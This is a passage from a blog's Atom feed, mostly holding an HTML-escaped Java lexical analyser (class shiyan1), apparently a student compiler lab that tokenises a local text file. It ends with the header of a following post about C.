&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;import java.io.FileReader;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;import java.io.IOException;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;public class shiyan1 &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;public int zifu;  //扫描字符&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;public int zhuangtai;//保留字状态码  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;public String [] name=new String[]&amp;#123;&lt;span class=&quot;string&quot;&gt;&quot;关键字&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;标识符&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;常数&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;关系运算符&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;运算符&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;分界符&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;error&quot;&lt;/span&gt;&amp;#125;;	      &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	    public StringBuffer strToken = new StringBuffer();//存放构成单词符号的字符串  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	      &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	    public String [] retainWord = new String[]&amp;#123;&lt;span class=&quot;string&quot;&gt;&quot;int&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;if&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;else&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;return&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;main&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;void&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;while&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;break&quot;&lt;/span&gt;&amp;#125;;//保留字  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	      &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	    //判断是否是字母  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	    public boolean &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;title&quot;&gt;IsLetter&lt;/span&gt;&lt;/span&gt;()&amp;#123;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;((zifu&amp;gt;=65 &amp;amp;&amp;amp; zifu &amp;lt;= 90) || (zifu &amp;gt;= 97 &amp;amp;&amp;amp; zifu &amp;lt;=122))&amp;#123;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	            &lt;span class=&quot;built_in&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	        &amp;#125;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	        &lt;span class=&quot;built_in&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	    &amp;#125;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	      &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	    //判断是否是数字  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	    public boolean &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;title&quot;&gt;IsDigit&lt;/span&gt;&lt;/span&gt;()&amp;#123;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(zifu&amp;gt;=48 &amp;amp;&amp;amp; zifu &amp;lt;= 57)&amp;#123;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	            &lt;span class=&quot;built_in&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	        &amp;#125;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	        &lt;span class=&quot;built_in&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	    &amp;#125;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	      &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	    //判断是否是空格  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	    public boolean IsBC(int ch)&amp;#123;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(ch == 32)&amp;#123;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	            &lt;span class=&quot;built_in&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	        &amp;#125;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	        &lt;span class=&quot;built_in&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	    &amp;#125;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	      &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	    //连接字符  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	    public void Concat(char ch)&amp;#123;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	        strToken.append(ch);  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	    &amp;#125;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	      &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	    //判断是否是保留字  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	    public int &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;title&quot;&gt;Reserve&lt;/span&gt;&lt;/span&gt;()&amp;#123;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(int i = 0;i &amp;lt; retainWord.length;i++)&amp;#123;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(strToken.toString().equals(retainWord[i]))&amp;#123;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                &lt;span class=&quot;built_in&quot;&gt;return&lt;/span&gt; 1;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	            &amp;#125;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	        &amp;#125;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(strToken.length() != 0)&amp;#123;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	        	//String strTaken;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;				&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(int m=0;m&amp;lt;strToken.length();m++)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	            &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	        		&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;					&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(int j=1;j&amp;lt;m;j++)&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	        			&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(strToken.charAt(j)!=&lt;span class=&quot;string&quot;&gt;&#39;0&#39;&lt;/span&gt; || strToken.charAt(j)!=&lt;span class=&quot;string&quot;&gt;&#39;1&#39;&lt;/span&gt; || strToken.charAt(j)!=&lt;span class=&quot;string&quot;&gt;&#39;2&#39;&lt;/span&gt; ||strToken.charAt(j)!=&lt;span class=&quot;string&quot;&gt;&#39;3&#39;&lt;/span&gt; || strToken.charAt(j)!=&lt;span class=&quot;string&quot;&gt;&#39;4&#39;&lt;/span&gt; || strToken.charAt(j)!=&lt;span class=&quot;string&quot;&gt;&#39;5&#39;&lt;/span&gt; || strToken.charAt(j)!=&lt;span class=&quot;string&quot;&gt;&#39;6&#39;&lt;/span&gt; || strToken.charAt(j)!=&lt;span class=&quot;string&quot;&gt;&#39;7&#39;&lt;/span&gt; || strToken.charAt(j)!=&lt;span class=&quot;string&quot;&gt;&#39;8&#39;&lt;/span&gt; || strToken.charAt(j)!=&lt;span class=&quot;string&quot;&gt;&#39;9&#39;&lt;/span&gt; )&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		         		&amp;#123;&lt;span class=&quot;built_in&quot;&gt;return&lt;/span&gt; 5;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		         		&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		         		&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	        		    	&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	         		   &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;					&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;					&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(strToken.charAt(m)&amp;gt;=&lt;span class=&quot;string&quot;&gt;&#39;0&#39;&lt;/span&gt; &amp;amp;&amp;amp; strToken.charAt(m)&amp;lt;=&lt;span class=&quot;string&quot;&gt;&#39;9&#39;&lt;/span&gt;)&amp;#123;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                &lt;span class=&quot;built_in&quot;&gt;return&lt;/span&gt; 3; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                	&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	        		&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	        		&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;				//&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(strToken.charAt(0)!=IsLetter())&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;				&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	        &amp;#125; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	       &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	          //&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;()&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	        &lt;span class=&quot;built_in&quot;&gt;return&lt;/span&gt; 2;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	    &amp;#125;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	      &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	    //  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	    public void &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;title&quot;&gt;Retract&lt;/span&gt;&lt;/span&gt;()&amp;#123;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	    	zhuangtai = Reserve();  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(zhuangtai == 1)&amp;#123;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                System.out.println(&lt;span class=&quot;string&quot;&gt;&quot;(&#39;&quot;&lt;/span&gt;+1+&lt;span class=&quot;string&quot;&gt;&quot;&#39;,&#39;&quot;&lt;/span&gt;+strToken+&lt;span class=&quot;string&quot;&gt;&quot;&#39;,&#39;&quot;&lt;/span&gt;+name[0]+&lt;span class=&quot;string&quot;&gt;&quot;&#39;)&quot;&lt;/span&gt;);  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	        &amp;#125;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(zhuangtai == 2)&amp;#123;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                System.out.println(&lt;span class=&quot;string&quot;&gt;&quot;(&#39;&quot;&lt;/span&gt;+2+&lt;span class=&quot;string&quot;&gt;&quot;&#39;,&#39;&quot;&lt;/span&gt;+strToken+&lt;span class=&quot;string&quot;&gt;&quot;&#39;,&#39;&quot;&lt;/span&gt;+name[1]+&lt;span class=&quot;string&quot;&gt;&quot;&#39;)&quot;&lt;/span&gt;);  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	        &amp;#125;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	        &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(zhuangtai == 3)&amp;#123;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                System.out.println(&lt;span class=&quot;string&quot;&gt;&quot;(&#39;&quot;&lt;/span&gt;+3+&lt;span class=&quot;string&quot;&gt;&quot;&#39;,&#39;&quot;&lt;/span&gt;+strToken+&lt;span class=&quot;string&quot;&gt;&quot;&#39;,&#39;&quot;&lt;/span&gt;+name[2]+&lt;span class=&quot;string&quot;&gt;&quot;&#39;)&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	        &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(zhuangtai == 5)&amp;#123;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    System.out.println(&lt;span class=&quot;string&quot;&gt;&quot;(&#39;&quot;&lt;/span&gt;+6+&lt;span class=&quot;string&quot;&gt;&quot;&#39;,&#39;&quot;&lt;/span&gt;+strToken+&lt;span class=&quot;string&quot;&gt;&quot;&#39;,&#39;&quot;&lt;/span&gt;+name[6]+&lt;span class=&quot;string&quot;&gt;&quot;&#39;)&quot;&lt;/span&gt;);  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	        &amp;#125;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	        strToken.delete(0, strToken.length());  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	    &amp;#125;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	      &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	    /**  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	     * 读取文件  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	     */  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	    public void &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;title&quot;&gt;scanner&lt;/span&gt;&lt;/span&gt;()&amp;#123;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	        BufferedReader br;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	        try &amp;#123;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	            br = new BufferedReader(new FileReader(&lt;span class=&quot;string&quot;&gt;&quot;C:/Users/Administrator/Desktop/rootkid/xx.txt&quot;&lt;/span&gt;));  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	            &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt;((zifu = br.read()) != -1)&amp;#123;   &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(IsBC(zifu) == &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;)&amp;#123;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(IsLetter())&amp;#123;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(IsLetter() == &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt; || IsDigit() == &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;)&amp;#123;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                            Concat((char)zifu);  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                        &amp;#125;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                    &amp;#125;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(IsDigit() == &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;)&amp;#123;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                        Concat((char)zifu);  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                    &amp;#125;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(IsDigit())&amp;#123;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                        Concat( (char)zifu);  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                    &amp;#125;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(zifu == 61)&amp;#123;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;((strToken.length() != 0 )&amp;amp;&amp;amp; (strToken.charAt(0) == &lt;span class=&quot;string&quot;&gt;&#39;=&#39;&lt;/span&gt;))&amp;#123;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                            strToken.append((char)zifu);  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                            System.out.println(&lt;span class=&quot;string&quot;&gt;&quot;(&#39;&quot;&lt;/span&gt;+4+&lt;span class=&quot;string&quot;&gt;&quot;&#39;,&#39;&quot;&lt;/span&gt;+strToken+&lt;span class=&quot;string&quot;&gt;&quot;&#39;,&#39;&quot;&lt;/span&gt;+name[3]+&lt;span class=&quot;string&quot;&gt;&quot;&#39;)&quot;&lt;/span&gt;);  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                            strToken.delete(0, strToken.length());  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                        &amp;#125;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&amp;#123;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                            strToken.append((char)zifu);  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                        &amp;#125;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                    &amp;#125;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(zifu == 43)&amp;#123;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                        Retract();  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                        System.out.println(&lt;span class=&quot;string&quot;&gt;&quot;(&#39;&quot;&lt;/span&gt;+4+&lt;span class=&quot;string&quot;&gt;&quot;&#39;,&#39;&quot;&lt;/span&gt;+ (char)zifu+&lt;span class=&quot;string&quot;&gt;&quot;&#39;,&#39;&quot;&lt;/span&gt;+name[4]+&lt;span class=&quot;string&quot;&gt;&quot;&#39;)&quot;&lt;/span&gt;);  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                    &amp;#125;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(zifu == 45)&amp;#123;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                        Retract();  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                        System.out.println(&lt;span class=&quot;string&quot;&gt;&quot;(&#39;&quot;&lt;/span&gt;+4+&lt;span class=&quot;string&quot;&gt;&quot;&#39;,&#39;&quot;&lt;/span&gt;+ (char)zifu+&lt;span class=&quot;string&quot;&gt;&quot;&#39;,&#39;&quot;&lt;/span&gt;+name[4]+&lt;span class=&quot;string&quot;&gt;&quot;&#39;)&quot;&lt;/span&gt;);  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                    &amp;#125;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(zifu == 42)&amp;#123;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                        Retract();  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                        System.out.println(&lt;span class=&quot;string&quot;&gt;&quot;(&#39;&quot;&lt;/span&gt;+4+&lt;span class=&quot;string&quot;&gt;&quot;&#39;,&#39;&quot;&lt;/span&gt;+ (char)zifu+&lt;span class=&quot;string&quot;&gt;&quot;&#39;,&#39;&quot;&lt;/span&gt;+name[4]+&lt;span class=&quot;string&quot;&gt;&quot;&#39;)&quot;&lt;/span&gt;);  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                    &amp;#125;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(zifu == 47)&amp;#123;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                        Retract();  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                        System.out.println(&lt;span class=&quot;string&quot;&gt;&quot;(&#39;&quot;&lt;/span&gt;+4+&lt;span class=&quot;string&quot;&gt;&quot;&#39;,&#39;&quot;&lt;/span&gt;+ (char)zifu+&lt;span class=&quot;string&quot;&gt;&quot;&#39;,&#39;&quot;&lt;/span&gt;+name[4]+&lt;span class=&quot;string&quot;&gt;&quot;&#39;)&quot;&lt;/span&gt;);  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                    &amp;#125;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;((char) zifu == &lt;span class=&quot;string&quot;&gt;&#39;;&#39;&lt;/span&gt;)&amp;#123;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                        Retract();  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                        System.out.println(&lt;span class=&quot;string&quot;&gt;&quot;(&#39;&quot;&lt;/span&gt;+5+&lt;span class=&quot;string&quot;&gt;&quot;&#39;,&#39;&quot;&lt;/span&gt;+ (char)zifu+&lt;span class=&quot;string&quot;&gt;&quot;&#39;,&#39;&quot;&lt;/span&gt;+name[5]+&lt;span class=&quot;string&quot;&gt;&quot;&#39;)&quot;&lt;/span&gt;);  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                    &amp;#125;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;((char) zifu == &lt;span class=&quot;string&quot;&gt;&#39;(&#39;&lt;/span&gt;)&amp;#123;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                        Retract();  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                        System.out.println(&lt;span class=&quot;string&quot;&gt;&quot;(&#39;&quot;&lt;/span&gt;+5+&lt;span class=&quot;string&quot;&gt;&quot;&#39;,&#39;&quot;&lt;/span&gt;+ (char)zifu+&lt;span class=&quot;string&quot;&gt;&quot;&#39;,&#39;&quot;&lt;/span&gt;+name[5]+&lt;span class=&quot;string&quot;&gt;&quot;&#39;)&quot;&lt;/span&gt;);  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                    &amp;#125;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;((char) zifu == &lt;span class=&quot;string&quot;&gt;&#39;)&#39;&lt;/span&gt;)&amp;#123;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                        Retract();  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                        System.out.println(&lt;span class=&quot;string&quot;&gt;&quot;(&#39;&quot;&lt;/span&gt;+5+&lt;span class=&quot;string&quot;&gt;&quot;&#39;,&#39;&quot;&lt;/span&gt;+ (char)zifu+&lt;span class=&quot;string&quot;&gt;&quot;&#39;,&#39;&quot;&lt;/span&gt;+name[5]+&lt;span class=&quot;string&quot;&gt;&quot;&#39;)&quot;&lt;/span&gt;);  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                    &amp;#125;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;((char) zifu == &lt;span class=&quot;string&quot;&gt;&#39;&amp;#123;&#39;&lt;/span&gt;)&amp;#123;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                        Retract();  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                        System.out.println(&lt;span class=&quot;string&quot;&gt;&quot;(&#39;&quot;&lt;/span&gt;+5+&lt;span class=&quot;string&quot;&gt;&quot;&#39;,&#39;&quot;&lt;/span&gt;+ (char)zifu+&lt;span class=&quot;string&quot;&gt;&quot;&#39;,&#39;&quot;&lt;/span&gt;+name[5]+&lt;span class=&quot;string&quot;&gt;&quot;&#39;)&quot;&lt;/span&gt;);  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                    &amp;#125;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;((char) zifu == &lt;span class=&quot;string&quot;&gt;&#39;&amp;#125;&#39;&lt;/span&gt;)&amp;#123;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                        Retract();  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                        System.out.println(&lt;span class=&quot;string&quot;&gt;&quot;(&#39;&quot;&lt;/span&gt;+5+&lt;span class=&quot;string&quot;&gt;&quot;&#39;,&#39;&quot;&lt;/span&gt;+ (char)zifu+&lt;span class=&quot;string&quot;&gt;&quot;&#39;,&#39;&quot;&lt;/span&gt;+name[5]+&lt;span class=&quot;string&quot;&gt;&quot;&#39;)&quot;&lt;/span&gt;);  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                    &amp;#125;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;((char) zifu == &lt;span class=&quot;string&quot;&gt;&#39;,&#39;&lt;/span&gt;)&amp;#123;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                        Retract();  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                        System.out.println(&lt;span class=&quot;string&quot;&gt;&quot;(&#39;&quot;&lt;/span&gt;+5+&lt;span class=&quot;string&quot;&gt;&quot;&#39;,&#39;&quot;&lt;/span&gt;+ (char)zifu+&lt;span class=&quot;string&quot;&gt;&quot;&#39;,&#39;&quot;&lt;/span&gt;+name[5]+&lt;span class=&quot;string&quot;&gt;&quot;&#39;)&quot;&lt;/span&gt;);  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                    &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                    &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                    //&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(zifu)&amp;#123;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                      &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                &amp;#125;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&amp;#123;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                    Retract();  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                &amp;#125;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	                  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	            &amp;#125;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	        &amp;#125; catch (FileNotFoundException e1) &amp;#123;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	            // TODO Auto-generated scatch block  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	            e1.printStackTrace();  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	        &amp;#125; catch (IOException e) &amp;#123;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	            // TODO Auto-generated catch block  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	            e.printStackTrace();  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	        &amp;#125;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	    &amp;#125;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	      &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	    public static void main(String[] args) &amp;#123;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	        shiyan1 compile2 = new shiyan1();  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	        compile2.scanner();  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	    &amp;#125;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Something you don&#39;t know about C !</title>
    <link href="http://yoursite.com/2017/10/10/new%2010/"/>
    <id>http://yoursite.com/2017/10/10/new 10/</id>
    <published>2017-10-09T16:27:53.094Z</published>
    <updated>2017-10-13T15:51:49.128Z</updated>
    
